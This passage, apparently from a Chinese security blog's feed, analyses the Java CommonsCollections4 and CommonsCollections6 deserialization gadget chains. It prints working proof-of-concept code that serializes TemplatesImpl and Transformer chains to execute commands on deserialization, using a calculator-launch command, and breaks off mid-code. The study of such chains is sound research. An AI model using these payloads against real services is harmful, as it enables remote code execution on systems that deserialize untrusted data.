class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/9 10:51</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections4</span> <span class="variable">commonsCollections4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections4</span>();</span><br><span class="line">        commonsCollections4.serialize();</span><br><span class="line">        commonsCollections4.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建evailClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evailClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evailClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 将代码插进static&#123;&#125;</span></span><br><span class="line">        evailClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">// 转换成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = evailClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>,targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 利用链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; templates &#125; )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 通过反射将comparator修改为前面的链子</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(priorityQueue);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2021/11/10/CommonsCollections4/image-20221011110805910.png" alt="image-20221011110805910"></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections6利用链分析</title>
      <link href="/2021/11/10/CommonsCollections6/"/>
      <url>/2021/11/10/CommonsCollections6/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections6利用链分析"><a href="#CommonsCollections6利用链分析" class="headerlink" title="CommonsCollections6利用链分析"></a>CommonsCollections6利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>为什么跳过了<code>CommonsCollections2</code>先学习<code>CommonsCollections6</code>？</strong></p><p>前面学习的<code>CommonsCollections</code>和<code>CommonsCollections1</code>链，可以看到都受限于 JDK 版本，在<code>jdk8u71</code>之后就无法利用，原因则是前面已经提过的。</p><p>而为了实现在高版本 JDK 的环境下依然能利用的问题，<code>CommonsCollections6</code>这条链子应运而生。因此在学完<code>CommonsCollections1</code>后接着学习<code>CommonsCollections6</code>会比较系统。</p><p>该条利用链的利用条件如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 3.1 - 3.2.1</span><br><span class="line">JDK版本暂无</span><br></pre></td></tr></table></figure><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>先看一些 p 牛给出的简化利用链：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">    java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashMap.readObject()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p>在 JDK 8u71 之后，<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的<code>readObject()</code>方法发生了变化导致无法再触发<code>LazyMap</code>类的<code>get()</code>方法，而思路自然而然就是再次寻找其他能触发<code>LazyMap#get()</code>的地方。在利用链中可以看到最后找到的是<code>TiedMapEntry</code>类</p><p>跟进查看<code>TiedMapEntry#hashCode()</code>方法源码，调用了<code>this.getValue();</code><br><img src="/2021/11/10/CommonsCollections6/image-20221004215622854.png" alt="image-20221004215622854"></p><p>接着跟进<code>this.getValue()</code>方法<br><img src="/2021/11/10/CommonsCollections6/image-20221004220012400.png" alt="image-20221004220012400"></p><p>可以看到在<code>getValue()</code>中调用了<code>map.get()</code>方法，并且<code>map</code>和<code>key</code>都是通过构造函数传入，完全可控，所以可以通过构造传参调用到<code>LazyMap#get()</code>，满足了我们的期望。</p><p>接下来就是寻找可以调用<code>TiedMapEntry#hashCode()</code>，在前面已经学习过的<a href="./02-反序列化专区/0-URLDNS利用链/URLDNS利用链.md">URLDNS利用链分析</a>章节中，我们已经知道在<code>HashMap#readObject()</code>里，<code>putVal()</code>方法对<code>key</code>进行了<code>hash()</code>计算，进而调用传进来的<code>key</code>的<code>hashCode()</code>的方法。</p><p>因此我们只要让<code>key</code>为<code>TiedMapEntry</code>对象，就可以完成整个攻击链。开始编写初始 POC：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/4 21:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections6</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections6</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;keyTest&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>但运行后却没有弹出计算器，开始找找原因，我们在<code>LazyMap#get()</code>方法处打断点，结果发现一共调用了两次<code>LazyMap#get()</code></p><p>第一次时进入了 if 方法<br><img src="/2021/11/10/CommonsCollections6/image-20221008152547485.png" alt="image-20221008152547485"></p><p>第二次时没有进入 if 方法<br><img src="/2021/11/10/CommonsCollections6/image-20221008152629215.png" alt="image-20221008152629215"></p><p>为什么会调用两次<code>LazyMap#get()</code>方法呢？仔细再跟一遍才想起来<code>HashMap#put()</code>方法也会调用到<code>hashcode()</code><br><img src="/2021/11/10/CommonsCollections6/image-20221008152723595.png" alt="image-20221008152723595"></p><p>因此在<code>expMap.put(tiedMapEntry,&quot;valueTest&quot;);</code>语句时就一次触发了一次<code>LazyMap#get()</code>利用链，但因为我们故意制造的<code>fakeTransformers</code>所以没有触发命令执行，但是却在这里将<code>keyTest</code>添加进了<code>outerMap</code>中。<br><img src="/2021/11/10/CommonsCollections6/image-20221008153011697.png" alt="image-20221008153011697"></p><p>因此在经过反序列化后调用利用链时，再次进行 if 判断时，<code>keyTest</code>在<code>outermap</code>对象里，跳过了判断进入 else 语句，导致无法触发命令执行。</p><p>根据 p 牛的做法就是再写一句<code>outerMap.remove(&quot;keyTest&quot;);</code>将 key 从 <code>outerMap</code>中移除，因此最终 POC 为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/4 21:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections6</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections6</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span 